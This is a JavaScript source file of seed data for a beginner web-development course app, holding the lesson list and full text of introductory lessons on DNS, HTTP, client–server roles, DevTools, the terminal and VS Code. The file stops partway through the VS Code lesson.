import { create } from 'zustand'

// ─── Seed data ────────────────────────────────────────────────────────────────

export const PATHS = [
  {
    id: 'full-stack-web',
    icon: '🌐',
    name: 'Full Stack Web Development',
    description: 'Build complete web apps from frontend to database — the most versatile path in tech',
    color: 'violet',
    tag: 'Path',
    lessons_data: [
      // ── Module 0: How the Internet Actually Works ────────────────────────
      { id: 'm0-dns-ip',          title: 'What happens when you type a URL — DNS, IP, servers',   duration: '10 min', part: 'M0: Internet' },
      { id: 'm0-client-server',   title: 'Client vs server — who does what',                     duration: '8 min',  part: 'M0: Internet' },
      { id: 'm0-http',            title: 'HTTP/HTTPS — requests, responses, status codes',       duration: '9 min',  part: 'M0: Internet' },
      { id: 'm0-frontend-backend',title: 'Front-end vs back-end vs database — how they talk',    duration: '8 min',  part: 'M0: Internet' },
      { id: 'm0-hosting-devtools',title: 'Hosting, deployment & browser DevTools Network tab',  duration: '8 min',  part: 'M0: Internet' },
      // ── Module 1: Tooling Setup ───────────────────────────────────────────
      { id: 'm1-terminal',        title: 'The terminal — navigating folders, running commands',  duration: '9 min',  part: 'M1: Tooling' },
      { id: 'm1-vscode',          title: 'VS Code — extensions, integrated terminal, settings',  duration: '6 min',  part: 'M1: Tooling' },
      { id: 'm1-git-fundamentals',title: 'Git fundamentals — init, add, commit, log, branches',  duration: '11 min', part: 'M1: Tooling' },
      { id: 'm1-github',          title: 'GitHub — remotes, push/pull, PRs, README basics',      duration: '10 min', part: 'M1: Tooling' },
      { id: 'm1-project-structure',title: 'Project file structure & intro to npm/package.json',  duration: '8 min',  part: 'M1: Tooling' },
      // ── Module 2: Front-End Fundamentals ──────────────────────────────────
      { id: 'm2a-html-semantics', title: 'HTML — semantic structure, tags, forms, accessibility',duration: '10 min', part: 'M2: Front-End' },
      { id: 'm2b-css-box-model',  title: 'CSS — box model, selectors, the cascade',              duration: '9 min',  part: 'M2: Front-End' },
      { id: 'm2b-css-layout',     title: 'CSS — flexbox, grid, responsive design basics',        duration: '10 min', part: 'M2: Front-End' },
      { id: 'm2c-js-fundamentals',title: 'JavaScript — variables, functions, conditionals, loops',duration: '11 min', part: 'M2: Front-End' },
      { id: 'm2c-js-dom-fetch',   title: 'The DOM, event listeners & the Fetch API',             duration: '12 min', part: 'M2: Front-End' },
      // ── Module 3: React Fundamentals ───────────────────────────────────────
      { id: 'm3-why-react',       title: 'Why frameworks — components, props, JSX',              duration: '10 min', part: 'M3: React' },
      { id: 'm3-state-usestate',  title: 'State & the useState hook — re-renders explained',      duration: '10 min', part: 'M3: React' },
      { id: 'm3-events-forms',    title: 'Events & forms the React way',                         duration: '9 min',  part: 'M3: React' },
      { id: 'm3-useeffect',       title: 'useEffect & side effects — fetching data on load',     duration: '9 min',  part: 'M3: React' },
      { id: 'm3-composition',     title: 'Component composition & project folder structure',     duration: '8 min',  part: 'M3: React' },
      // ── Module 4: Back-End Fundamentals ────────────────────────────────────
      { id: 'm4-nodejs-servers',  title: 'What a server does — intro to Node.js',                duration: '9 min',  part: 'M4: Back-End' },
      { id: 'm4-express-api',     title: 'Building a simple API with Express — routes, JSON',    duration: '11 min', part: 'M4: Back-End' },
      { id: 'm4-rest-env',        title: 'REST principles & environment variables',              duration: '9 min',  part: 'M4: Back-End' },
      { id: 'm4-databases-sql',   title: 'Databases intro — relational vs document, SQL basics', duration: '13 min', part: 'M4: Back-End' },
      { id: 'm4-crud',            title: 'CRUD operations connected to a real database',          duration: '12 min', part: 'M4: Back-End' },
      { id: 'm4-auth-basics',     title: 'Authentication basics — sessions, tokens, hashing',    duration: '10 min', part: 'M4: Back-End' },
      // ── Module 5: Connecting the Stack ─────────────────────────────────────
      { id: 'm5-api-from-react',  title: 'Calling your own API from React — fetch, loading state',duration: '10 min', part: 'M5: Full Stack' },
      { id: 'm5-cors',            title: 'CORS — what it is and why it exists',                  duration: '6 min',  part: 'M5: Full Stack' },
      { id: 'm5-state-management',title: 'State management patterns as your app grows',          duration: '8 min',  part: 'M5: Full Stack' },
      { id: 'm5-deploy-debug',    title: 'Deployment & debugging across the full stack',         duration: '12 min', part: 'M5: Full Stack' },
      // ── Module 6: Security Essentials ──────────────────────────────────────
      { id: 'm6-security-mindset',title: 'The security mindset — "works" vs "can be abused"',    duration: '8 min',  part: 'M6: Security' },
      { id: 'm6-sql-injection',   title: 'SQL injection & XSS — how parameterized queries help', duration: '11 min', part: 'M6: Security' },
      { id: 'm6-secrets-auth',    title: 'Secrets management, password hashing & auth pitfalls', duration: '11 min', part: 'M6: Security' },
      { id: 'm6-https-vuln-scan', title: 'HTTPS, CSRF & spot-the-vulnerability exercise',        duration: '10 min', part: 'M6: Security' },
      // ── Module 7: Vibecoding with AI ───────────────────────────────────────
      { id: 'm7-ai-tools',        title: 'How AI coding tools work — autocomplete to agents',    duration: '9 min',  part: 'M7: Vibecoding' },
      { id: 'm7-prompting',       title: 'Prompting for code — stack, constraints, style',       duration: '11 min', part: 'M7: Vibecoding' },
      { id: 'm7-reading-output',  title: 'Reading AI output critically — spotting bugs & lies',  duration: '11 min', part: 'M7: Vibecoding' },
      { id: 'm7-iterative',       title: 'Iterative workflow — small asks, test each step',      duration: '9 min',  part: 'M7: Vibecoding' },
      { id: 'm7-ai-debug-git',    title: 'Debugging AI code & version control discipline',       duration: '10 min', part: 'M7: Vibecoding' },
      { id: 'm7-ethics-limits',   title: 'Ethics — don\'t ship code you don\'t understand',       duration: '8 min',  part: 'M7: Vibecoding' },
      // ── Module 8: Capstone Project ─────────────────────────────────────────
      { id: 'm8-planning',        title: 'Planning your capstone — spec, data model, routes',    duration: '10 min', part: 'M8: Capstone' },
      { id: 'm8-building',        title: 'Building with AI — manual parts, security audit',      duration: '14 min', part: 'M8: Capstone' },
      { id: 'm8-deploy-present',  title: 'Deploy, README & presenting what AI got right/wrong',  duration: '10 min', part: 'M8: Capstone' },
    ],
    modules: [
      { id: 'm0', title: 'How the Internet Actually Works',          goal: 'Demystify the "magic" before touching a single tool.',                                                                                                                  deliverables: 'A simple diagram tracing a request from browser to server and back.' },
      { id: 'm1', title: 'Tooling Setup — The Developer\'s Workbench', goal: 'Get comfortable in the environment before writing real code.',                                                                                                          deliverables: 'A GitHub account, first repo, and a pushed "hello world" file — all manually, no AI yet.' },
      { id: 'm2', title: 'Front-End Fundamentals',                   goal: 'Build static, real web pages by hand.',                                                                                                                                   deliverables: 'A hand-coded static personal portfolio page (HTML/CSS/JS only), deployed via GitHub Pages.' },
      { id: 'm3', title: 'React Fundamentals',                       goal: 'Move from vanilla DOM manipulation to a component-based mental model — the paradigm most AI tools default to.',                                                            deliverables: 'Portfolio converted to a React app with at least one piece of interactive state.' },
      { id: 'm4', title: 'Back-End Fundamentals',                    goal: 'Understand servers, APIs, and data before letting AI generate any of it.',                                                                                                 deliverables: 'A small hand-built API (to-do list backend) with a working database, tested via Postman/curl.' },
      { id: 'm5', title: 'Connecting the Stack',                     goal: 'Put front-end (React) and back-end together, still without AI.',                                                                                                            deliverables: 'First full-stack app, built and deployed entirely by hand — the benchmark project for comparison once AI enters.' },
      { id: 'm6', title: 'Security Essentials',                      goal: 'Give students a mental checklist to catch insecure code — their own or AI-generated.',                                                                                      deliverables: 'A written list of vulnerabilities found in a deliberately vulnerable mini-app, with fixes for each.' },
      { id: 'm7', title: 'Vibecoding — Using AI Effectively',        goal: 'Now that they know what "correct" and "secure" look like, teach them to direct AI like a competent junior developer directing a very fast intern.',                         deliverables: 'A written log of every prompt + what they changed/rejected and why while rebuilding their Module 5 project with AI.' },
      { id: 'm8', title: 'Capstone Project',                         goal: 'Full-stack app, built primarily via vibecoding, but grounded in real understanding.',                                                                                       deliverables: 'Deployed project, public GitHub repo with README, short presentation on what AI got right/wrong.' },
    ],
  },
  {
    id: 'mobile-app',
    icon: '📱',
    name: 'Mobile App Development',
    description: 'Create iOS and Android apps with modern cross-platform tooling',
    color: 'teal',
    tag: 'Path',
    lessons_data: [],
  },
  {
    id: 'blockchain-web3',
    icon: '⛓️',
    name: 'Blockchain & Web3 Development',
    description: 'Smart contracts, dApps, and decentralized apps on the open web',
    color: 'amber',
    tag: 'Path',
    lessons_data: [],
  },
  {
    id: 'game-dev',
    icon: '🎮',
    name: 'Game Development',
    description: 'Design and build interactive games with engines and game logic',
    color: 'red',
    tag: 'Path',
    lessons_data: [],
  },
  {
    id: 'os-low-level',
    icon: '⚙️',
    name: 'OS & Low-Level Programming',
    description: 'Understand how computers really work — memory, processes, and systems',
    color: 'stone',
    tag: 'Path',
    lessons_data: [],
  },
  {
    id: 'ai-ml',
    icon: '🧠',
    name: 'AI & Machine Learning Engineering',
    description: 'Train models, build AI pipelines, and ship intelligent applications',
    color: 'green',
    tag: 'Path',
    lessons_data: [],
  },
]

// ─── Full lesson content ──────────────────────────────────────────────────────

export const LESSONS_CONTENT = {

  // ═══════════════════════════════════════════════════════════════
  // Module 0: How the Internet Actually Works
  // ═══════════════════════════════════════════════════════════════

  'm0-dns-ip': {
    pathId: 'full-stack-web',
    title: 'What happens when you type a URL — DNS, IP, servers',
    duration: '10 min',
    mekLabel: 'enough to explain what happens when you visit any website',
    sections: [
      {
        heading: 'You type a URL, a page appears — but what actually happened?',
        body: `You open your browser, type "google.com" into the address bar, hit Enter, and within a second a full page loads. It feels like magic — one action, instant result. But between that keystroke and the page appearing, about a dozen things happen in sequence, each one a small miracle of engineering. This lesson walks through every step so you never have to feel like the internet is a black box again.`,
      },
      {
        heading: 'Step 1 — You typed a name, not an address',
        body: `When you type "google.com", you are typing a domain name. It is human-friendly — easy to remember, easy to type. But computers do not use names. Computers use numbers called IP addresses. Every device connected to the internet — every server, every laptop, every phone — has an IP address. It looks something like this: 142.250.80.14. That is Google's actual address on the internet. If you typed that number into your browser instead of "google.com", it would still work. The domain name is just a convenient label for the number.`,
        callout: `A domain name is a nickname for a number. Your browser needs the number — the IP address — to connect. The domain name is just how humans find it.`,
      },
      {
        heading: 'Step 2 — DNS: the phonebook of the internet',
        body: `So your browser has "google.com" but needs "142.250.80.14". How does it get from one to the other? It asks DNS — the Domain Name System. DNS is often called the phonebook of the internet. When you want to call a friend, you look up their name in your contacts and get their phone number. DNS does exactly that: you give it a domain name, it gives you the IP address. Your browser sends a DNS query to a DNS server (usually run by your internet provider or a service like Google's 8.8.8.8), and the DNS server responds with the IP address. This takes about 10–50 milliseconds.`,
      },
      {
        heading: 'Step 3 — Your browser sends a request to the server',
        body: `Now your browser has an IP address. It opens a connection to that address and sends an HTTP request — a message asking for the webpage. "Hello server at 142.250.80.14, please send me the page at /". This request includes information about your browser, your preferred language, and more. The server receives this request and processes it. If it has the page you asked for, it sends back an HTTP response containing the HTML, CSS, and JavaScript that make up the webpage.`,
      },
      {
        heading: 'Step 4 — The server responds, your browser renders',
        body: `The response arrives at your browser as raw text — lines of HTML code. Your browser reads this code and starts building the page. It fetches additional resources the page needs (images, stylesheets, scripts), runs any JavaScript, and paints everything to your screen. All of this — DNS lookup, connection, request, response, rendering — happens in under a second for most sites. The whole chain is: you type a URL → DNS lookup → browser connects to the IP address → browser sends an HTTP request → server processes it → server sends back a response → browser renders the page.`,
        code: `// The full journey in one diagram:\n//\n// You type:     google.com\n//       ↓\n// DNS lookup →  142.250.80.14\n//       ↓\n// Browser connects to that IP\n//       ↓\n// Browser sends: "Give me the page at /"\n//       ↓\n// Server sends back: HTML, CSS, JS\n//       ↓\n// Browser renders the page on your screen`,
      },
    ],
    aiPrompt: `Explain DNS and IP addresses to me like I am ten years old. Use an analogy. Then show me a real example — look up the IP address of a website I visit often and walk me through what happens.`,
    terminalMission: `Try: nslookup google.com — this shows you the IP address behind a domain name. Then try: ping google.com — see how fast your computer can reach that server.`,
  },

  'm0-client-server': {
    pathId: 'full-stack-web',
    title: 'Client vs server — who does what',
    duration: '8 min',
    mekLabel: 'enough to know which side of an app to look at when something breaks',
    sections: [
      {
        heading: 'The internet is just computers talking to each other',
        body: `When you use any app or website, there are at least two computers involved. One is the device in front of you — your laptop, phone, or tablet. The other is a computer somewhere else — in a data center, a warehouse, or even across the ocean. The conversation between these two computers is the entire internet. Everything you do online comes down to this: one computer asks for something, another computer provides it.`,
      },
      {
        heading: 'The client: the one who asks',
        body: `The client is the device in your hands. It is called the client because it "consumes" the service — it asks for data, receives it, and displays it to you. Your web browser is a client. Your phone's Instagram app is a client. Your email app is a client. The client's job is to make things look good and respond to what you do. It handles the buttons you click, the text you type, the images you see. Everything that happens on your device is the client side.`,
      },
      {
        heading: 'The server: the one who provides',
        body: `The server is a computer that sits in a data center — a big building with thousands of computers, backup power, and fast internet connections. Its job is to listen for incoming requests and respond with data. When your browser sends "give me this page", the server receives it, looks up the page, and sends it back. Servers do not have screens or keyboards. They are pure workhorses — they compute, store, and serve data 24/7 without anyone touching them.`,
        callout: `A server is just a computer. It runs an operating system like your laptop does. The difference is it is designed to be reliable and always-on, and it has no monitor because nobody needs to watch it work.`,
      },
      {
        heading: 'The restaurant analogy',
        body: `Imagine a restaurant. You are the client. You sit at a table and look at a menu. When you decide what you want, you tell the waiter. The waiter takes your order to the kitchen. The kitchen is the server — it receives the order, prepares your food, and sends it back. You never go into the kitchen yourself. You just interact with what comes out of it. This is exactly how the client-server relationship works. The client makes requests. The server processes them and sends back responses. The client never accesses the server's inner workings directly.`,
        code: `// Client-Server in action:\n//\n// You (client) → click "Show my profile"\n//      ↓\n// Browser sends: GET /profile\n//      ↓\n// Server receives request\n// Server looks up your data in the database\n//      ↓\n// Server sends back: { name: "...", email: "..." }\n//      ↓\n// Browser displays your profile page`,
      },
      {
        heading: 'Why you need to know the difference',
        body: `When something breaks in an app, the first question is always: "Is this a client problem or a server problem?" If the page is not loading at all, that could be a server issue. If the page loads but a button does nothing when you click it, that is likely a client issue. If your data is wrong or missing, that could be either side. Knowing the difference tells you where to look and what to tell AI when you ask for help. If you say "the button does nothing on click", AI knows it is a frontend problem. If you say "the API returns a 500 error", AI knows it is a server problem. That distinction alone saves hours.`,
      },
    ],
    aiPrompt: `Using the restaurant analogy, explain to me the difference between client-side and server-side code in a web application. Give me three examples of tasks that happen on the client and three that happen on the server.`,
    terminalMission: `Type: curl https://example.com — this is your computer acting as a client, making a request to a server. See the raw HTML response the server sends back.`,
  },

  'm0-http': {
    pathId: 'full-stack-web',
    title: 'HTTP/HTTPS — requests, responses, status codes',
    duration: '9 min',
    mekLabel: 'enough to read network errors and understand what the browser is telling you',
    sections: [
      {
        heading: 'HTTP is the language computers use to talk on the web',
        body: `HTTP stands for HyperText Transfer Protocol. That is a fancy way of saying "a agreed-upon set of rules for how to ask for and receive web content." When your browser sends a request to a server, it formats that request in a specific way that the server understands. When the server responds, it also uses a specific format that the browser understands. Think of it like ordering at a coffee shop. You say "I would like a medium latte, please." The barista does not say "I would like a medium latte, please" back — they say "That will be $4.50" or "Here you go." Both sides follow an agreed script. HTTP is that script for computers.`,
      },
      {
        heading: 'HTTP methods — the verb of the request',
        body: `Every HTTP request has a method — a verb that tells the server what the client wants to do. The most common ones are GET and POST. GET means "give me data." When you visit a webpage, your browser sends a GET request. POST means "here is data, please process it." When you submit a login form, your browser sends a POST request with your username and password. There are others — PUT (update something), DELETE (remove something), PATCH (partially update something) — but GET and POST cover most of what you will see.`,
        code: `// GET — retrieve data\n// Browser asks: "Give me the homepage"\nGET / HTTP/1.1\nHost: example.com\n\n// POST — send data\n// Browser says: "Here is a login form, process it"\nPOST /login HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{"email": "user@example.com", "password": "..."}`,
      },
      {
        heading: 'HTTP status codes — the server tells you what happened',
        body: `When the server responds, it includes a status code — a three-digit number that summarizes the result. There are hundreds of status codes, but you only need to know about five of them to understand almost everything that happens. Status codes are grouped by the first digit: 2xx means success, 3xx means redirect, 4xx means you made a mistake (client error), and 5xx means the server made a mistake (server error).`,
      },
      {
        heading: 'The four status codes you will see 99% of the time',
        body: `There are hundreds of HTTP status codes, but you will only ever need to know four of them to understand almost everything that happens on the web. Learn these, and you will never look at a broken page the same way again.`,
      },
      {
        heading: '200 OK — everything worked',
        body: `The server found what you asked for and sent it back successfully. This is the ideal response. When you see 200 in your DevTools Network tab, that request is fine. The problem is somewhere else.`,
      },
      {
        heading: '301 Moved Permanently — the page moved',
        body: `The page you asked for has a new address. The browser automatically follows the new address, so you rarely notice these. But when vibecoding, AI sometimes generates routes that redirect in unexpected ways.`,
      },
      {
        heading: '404 Not Found — the page does not exist',
        body: `The server looked everywhere and could not find what you asked for. Usually a typo in the URL — or in vibecoding, AI linked to a route you have not created yet. This is the most common error you will see while learning. It is almost never a crisis. It just means the path is wrong.`,
        callout: `404 is a client error — your browser asked for something that does not exist. The server is working fine. Fix the URL, not the server.`,
      },
      {
        heading: '500 Internal Server Error — the server crashed',
        body: `Something went wrong on the server side. The code broke. Your browser sent a perfectly valid request, but the server could not handle it. This is the server equivalent of "I have no idea what just happened." Unlike 404, this IS the server's fault. When you see 500, go look at your backend code and server logs.`,
        callout: `500 is a server error — the request was fine, but the server code crashed. Check your backend logic, not your frontend.`,
      },
      {
        heading: 'HTTPS — the S stands for security',
        body: `HTTPS is HTTP with a layer of encryption on top called TLS (or its older name SSL). When you use HTTPS, the data traveling between your browser and the server is scrambled so that nobody in between can read it. This matters because the internet is not a direct wire — your request passes through multiple routers and computers before reaching the server. Without HTTPS, anyone along that path could read your passwords, credit card numbers, or private messages. When you see a padlock icon in your browser's address bar, it means the connection is encrypted with HTTPS. Every modern website should use it.`,
        callout: `HTTPS does not make the website itself secure — it secures the connection to it. A secure connection to a badly built website is still a badly built website. But an insecure connection means everything you send is visible to anyone watching. Always check for the padlock before entering sensitive data.`,
      },
    ],
    aiPrompt: `I am getting a [status code] error when visiting my website. Explain what that status code means in plain English, what usually causes it, and give me a checklist of things to check first. Do this for 404, 500, and 403 errors.`,
    terminalMission: `Type: curl -I https://example.com — the -I flag tells curl to show only the response headers, including the HTTP status code. See the "200 OK" at the top. Then try: curl -I https://example.com/nonexistent — you will get a 404.`,
  },

  'm0-frontend-backend': {
    pathId: 'full-stack-web',
    title: 'Front-end vs back-end vs database — how they talk',
    duration: '8 min',
    mekLabel: 'enough to trace a feature request all the way through the stack',
    sections: [
      {
        heading: 'Every web app has three layers',
        body: `Every web application, no matter how simple or complex, has three logical parts. The frontend — what users see and interact with. The backend — the logic and rules that process data and make decisions. And the database — where information is stored permanently. These three layers work together to make every feature work. A login form is not just a form. It is a frontend form → a backend check → a database lookup → a response back to the frontend. Understanding how these three layers connect is the single most important concept in full-stack development.`,
      },
      {
        heading: 'The frontend — the visible layer',
        body: `The frontend is everything that runs in the browser. It is made of HTML (structure), CSS (styling), and JavaScript (behavior). When you see a button, a text input, an image, or a loading spinner — that is the frontend. The frontend's job is to present data to the user and capture their input. It does not store anything permanently. When you close the tab, the frontend disappears. The frontend asks questions: "What should I show on this page? Where do I send this form data?" It relies on the backend for answers.`,
      },
      {
        heading: 'The backend — the brain',
        body: `The backend is a program running on a server that listens for requests from the frontend. It contains the rules of your application. "When a user submits this form, check if the email is valid, then check if the password is correct, then create a session, then send back a response." The backend does not care about colors, fonts, or button sizes. It cares about logic, data validation, security, and coordination. When you hear the term "API" (Application Programming Interface), it refers to the specific endpoints the backend exposes for the frontend to talk to.`,
        callout: `The frontend asks. The backend decides. The database remembers. Keep this in your head every time you build a feature.`,
      },
      {
        heading: 'The database — the memory',
        body: `The database is where permanent data lives. User accounts, posts, comments, product listings, orders — anything that should still exist tomorrow. The backend talks to the database to save new data, retrieve existing data, update it, or delete it. The frontend never talks to the database directly — that would be a massive security risk. The frontend talks to the backend, and the backend talks to the database. This three-layer architecture keeps data safe because the database is never exposed to the outside world.`,
      },
      {
        heading: 'How they work together — the full flow of a feature',
        code: `// When you log in to a website:\n//\n// 1. FRONTEND (browser)\n//    You type email + password, click "Sign in"\n//    Browser sends POST /login with your data\n//        ↓\n// 2. BACKEND (server)\n//    Express receives the request\n//    Validates: is email format correct?\n//    Hashes the password you sent\n//        ↓\n// 3. DATABASE\n//    Backend queries: "Find user with this email"\n//    Database returns the stored user record\n//        ↓\n// 4. BACKEND (server)\n//    Compares password hash with stored hash\n//    If match: creates a session token\n//        ↓\n// 5. FRONTEND (browser)\n//    Receives the session token\n//    Stores it, redirects to dashboard\n//    You see: "Welcome back!"`,
      },
      {
        heading: 'Why vibe coders must learn this separation',
        body: `When you ask AI to build an app, it will generate code that spans all three layers. If you do not know which layer is which, you will not be able to tell AI where to fix things when they break. If the login form looks wrong — that is a frontend problem. If clicking submit does nothing — that could be frontend (broken JS) or backend (wrong API endpoint). If data is not saving — that is a backend or database problem. Pointing AI to the right layer is 80% of the fix. The other 20% is reading the error.`,
      },
    ],
    aiPrompt: `I am building a todo list app. Walk me through what the frontend does, what the backend does, and what the database does when a user creates a new todo item. Use concrete examples of the code each layer would contain.`,
    terminalMission: `Type: curl https://jsonplaceholder.typicode.com/todos/1 — this is a simulated backend API response. See how the frontend would receive this JSON data and display it. The frontend displays it, the API provides it.`,
  },

  'm0-hosting-devtools': {
    pathId: 'full-stack-web',
    title: 'Hosting, deployment & browser DevTools Network tab',
    duration: '8 min',
    mekLabel: 'enough to inspect any live site\'s network traffic yourself',
    sections: [
      {
        heading: 'Hosting — putting your code on the internet',
        body: `You have built a website on your laptop. It works perfectly when you open it in your browser. But nobody else can see it — it is running on your machine, on your local network. Hosting is the process of putting your website's files on a server that is always connected to the internet so anyone can access it at any time. Hosting providers like Vercel, Netlify, and Render own thousands of servers in data centers around the world. You give them your code, and they make it available at a URL. That is all hosting is: renting space on an always-on computer.`,
        callout: `Your laptop is a terrible server. It goes to sleep, it runs on battery, your Wi-Fi cuts out. Data centers are designed for none of those problems. That is why you pay for hosting instead of running a server from your bedroom.`,
      },
      {
        heading: 'Deployment — sending your code to the hosting provider',
        body: `Deployment is the act of transferring your code from your laptop to the hosting provider. In the early days, you had to manually upload files via FTP. Today, deployment is usually automatic: you push your code to GitHub, and the hosting provider detects the change and pulls the new version. This is called continuous deployment — every time you push code, it goes live. No manual steps. No FTP. Just git push and it is done. If you can connect a GitHub repo to Vercel, you can deploy a website in under 5 minutes.`,
      },
      {
        heading: 'Browser DevTools — your window into the network',
        body: `Every modern browser has a set of developer tools built in. They are not just for developers — anyone can open them and see exactly what the browser is doing. The Network tab is the most useful one for understanding how the internet works. It shows every single request your browser makes: the URL requested, the HTTP method, the status code returned, how long it took, and the data sent back. When a website is loading slowly or broken, the Network tab tells you exactly which request is failing.`,
      },
      {
        heading: 'Mini activity — watch a real request happen',
        body: `Open a new tab and open DevTools (right-click anywhere on the page → Inspect → click the Network tab). Now visit any website — even google.com. You will see a list of every request the browser makes. Click on the first one — usually the HTML document. Look at the Headers section. You will see the request URL, the status code (200 OK), the HTTP method (GET), and the response headers the server sent back. This is the exact conversation we talked about in the HTTP lesson. You are watching it live.`,
        code: `// How to open DevTools Network tab:\n//\n// Chrome / Edge:\n//   Right-click → Inspect → "Network" tab\n//   Or: Ctrl + Shift + I (Windows)\n//        Cmd + Option + I (Mac)\n//\n// Firefox:\n//   Right-click → Inspect → "Network" tab\n//   Or: Ctrl + Shift + I (Windows)\n//        Cmd + Option + I (Mac)\n//\n// What to look for:\n//   [Name]        → the file being requested\n//   [Status]      → HTTP status code (200, 404, etc.)\n//   [Type]        → type of resource (document, script, etc.)\n//   [Size]        → how big the response was\n//   [Time]        → how long it took`,
      },
      {
        heading: 'What you will see — and what it means',
        body: `The first request is the HTML document itself — status 200. Then you will see CSS files (styling), JavaScript files (behavior), images, fonts, and data API calls. If any of these show a red status like 404 or 500, that resource failed to load. This is the first place to check when a website is broken. Not by guessing — by watching the actual requests. When you start vibecoding and AI builds a page that looks wrong, open DevTools Network tab. Refresh the page. Look for red entries. That is where the problem is. Nine times out of ten, it is a 404 on a resource the AI told the browser to load but forgot to create.`,
        callout: `The Network tab is the single most useful debugging tool you will ever use. Learn it now. It will save you more time than any AI prompt ever could.`,
      },
    ],
    aiPrompt: `I deployed my website but it is not loading properly. Walk me through using browser DevTools Network tab to figure out what is wrong. What should I look for first, and how do I interpret what I see?`,
    terminalMission: `Type: curl -I https://example.com — then open DevTools on any page and reload. Compare the status codes and headers you see. The curl output is what a server sees. The DevTools output is what your browser sees. They should match.`,
  },

  // ═══════════════════════════════════════════════════════════════
  // Module 1: Tooling Setup — The Developer's Workbench
  // ═══════════════════════════════════════════════════════════════

  'm1-terminal': {
    pathId: 'full-stack-web',
    title: 'The terminal — navigating folders, running commands',
    duration: '9 min',
    mekLabel: 'enough to install dependencies, run servers, and not fear the black screen',
    sections: [
      {
        heading: 'What is the terminal?',
        body: `The terminal is a text-based interface to your computer. Instead of clicking icons and windows, you type commands. It looks intimidating at first — a blank screen with a blinking cursor — but it is actually simpler than a graphical interface because there are no menus to search through. You just type what you want. Every developer uses the terminal constantly. When AI tells you to "run npm install" or "cd into the project folder", it is talking about the terminal. When you see a professional developer working, half the time they are in the terminal. This lesson makes that black screen feel like home.`,
        callout: `The terminal is not optional. Every tool you will use — Git, Node, npm, React — is run from the terminal. Learning it now means you never have to copy-paste commands you do not understand.`,
      },
      {
        heading: 'The prompt — what is that text telling you?',
        body: `When you open the terminal, you see something like: "user@computer ~ %". This is called the prompt. It tells you three things: who you are (user), which computer you are on (computer), and where you are in the file system (~ means your home folder). The $ or % at the end means "waiting for your command." Everything you type runs from that location. If you are in the wrong folder, your commands will fail. This is the #1 mistake beginners make — running a command in the wrong place. Always check the prompt to confirm where you are.`,
        code: `// What a terminal prompt looks like:\n//\n// user@macbook ~ %\n//  ↑     ↑      ↑   ↑\n//  you  computer home ready\n//\n// When you cd into a project:\n// user@macbook my-project %\n//                     ↑\n//              now inside "my-project"`,
      },
      {
        heading: 'The three navigation commands you need',
        body: `There are exactly three commands that handle all terminal navigation. pwd prints the current folder path (Print Working Directory). ls lists the files and folders in the current location. cd changes to a different folder (Change Directory). That is it. Three commands. If you know these three, you can get anywhere on your computer. When AI says "navigate to your project folder", it means use cd. When AI says "check what is in the folder", it means use ls. When you are lost, pwd tells you where you are.`,
        code: `pwd    # "Where am I?" — prints the full path\n       # Example output: /Users/you/projects/my-app\n\nls     # "What is here?" — lists files and folders\n       # Example output: index.html  style.css  app.js\n\ncd     # "Go somewhere" — changes folder\n       # cd Documents  → moves into Documents\n       # cd ..         → moves up one folder\n       # cd ~          → goes home\n       # cd /          → goes to the root of your drive`,
      },
      {
        heading: 'Creating and removing files and folders',
        body: `You will also need to create and remove things. mkdir makes a new folder (MaKe DIRectory). touch creates an empty file (or updates its timestamp). rm removes a file (ReMove). rm -rf removes a folder and everything inside it — this is the most dangerous command in the terminal because there is no undo. Always double-check before running rm -rf. One wrong keystroke and an entire project can disappear. When AI says "create a folder called src", you use mkdir src. When it says "delete that file", you use rm filename.`,
        code: `mkdir my-folder   # Creates a folder called "my-folder"\ntouch index.html   # Creates an empty file called "index.html"\nrm old-file.js     # Deletes a single file\nrm -rf my-folder   # Deletes a folder and EVERYTHING inside\n                   # ⚠️  There is no undo. Be very careful.`,
        callout: `The terminal trusts you completely. It will delete an entire project without asking "are you sure?" Always type ls before rm to check you are in the right folder. Always.`,
      },
      {
        heading: 'Why the terminal is non-negotiable for vibe coding',
        body: `When you code with AI, every single instruction will involve the terminal. "Install this package" means npm install. "Start the dev server" means npm run dev. "Navigate to the project" means cd. "Check what went wrong" means looking at the error output in the terminal. If the terminal scares you, you will avoid it, and you will struggle. If you learn the five commands in this lesson, you remove that fear. You become someone who can follow any instruction AI gives you, because the terminal is no longer a black box — it is just a text box where you type what you want. The next lesson builds on this by putting the terminal inside VS Code, so you never have to leave your editor.`,
      },
    ],
    aiPrompt: `I am completely new to the terminal. Walk me through creating a new folder called "my-project", navigating into it, creating an index.html file inside it, and listing the contents to confirm. Explain what each command does in plain English before I run it.`,
    terminalMission: `Work through these commands in order: pwd → ls → mkdir test-folder → ls → cd test-folder → touch hello.txt → ls → cd .. → rm -rf test-folder. Read the output of each command before running the next one.`,
  },

  'm1-vscode': {
    pathId: 'full-stack-web',
    title: 'VS Code — extensions, integrated terminal, settings',
    duration: '6 min',
    mekLabel: 'enough to set up a productive editor environment in 10 minutes',
    sections: [
      {
        heading: 'Why VS Code is the standard',
        body: `Visual Studio Code (VS Code) is the most popular code editor in the world, and for good reason. It is free, fast, and infinitely extensible. Unlike a basic text editor like Notepad, VS Code understands the code you are writing. It highlights syntax, suggests completions, catches errors before you run the code, and integrates with every tool in this module. When AI says "open this in your editor" or "add this to your code", it expects you to use something like VS Code. This lesson gets you set up so the editor becomes an extension of your thinking, not something you fight with.`,
      },
      {
        heading: 'The integrated terminal — your lesson 1 inside the editor',
        body: `Remember the terminal from the last lesson? VS Code has one built in. Press Ctrl + \` (backtick) — or Cmd + \` on Mac — and a terminal panel opens at the bottom of your editor. It is the exact same terminal you just learned. You can run pwd, ls, cd, npm install — everything — without leaving VS Code. This is huge. It means you can edit code in the top half of your screen and run commands in the bottom half without switching windows. When AI says "run npm install and then check for errors", you do both in the same place.`,
        callout: `The integrated terminal is the bridge between Module 1's terminal and everything else. Every time you learn a terminal command, practice it inside VS Code's integrated terminal. That is where you will live as a developer.`,
      },
      {
        heading: 'Essential extensions — install these now',
        body: `Extensions are plugins that add features to VS Code. You install them from the Extensions panel (the square icon on the left sidebar, or Ctrl+Shift+X). Here are the ones every beginner needs. ESLint highlights syntax errors and style problems in real time. Prettier automatically formats your code so it is clean and consistent. GitLens shows you who changed what line and when (useful when you start collaborating). A theme like "One Dark Pro" or "Catppuccin" makes the editor look good — and when your editor looks good, you enjoy coding more. Do not install fifty extensions at once. Start with these and add more only when you feel a specific need.`,
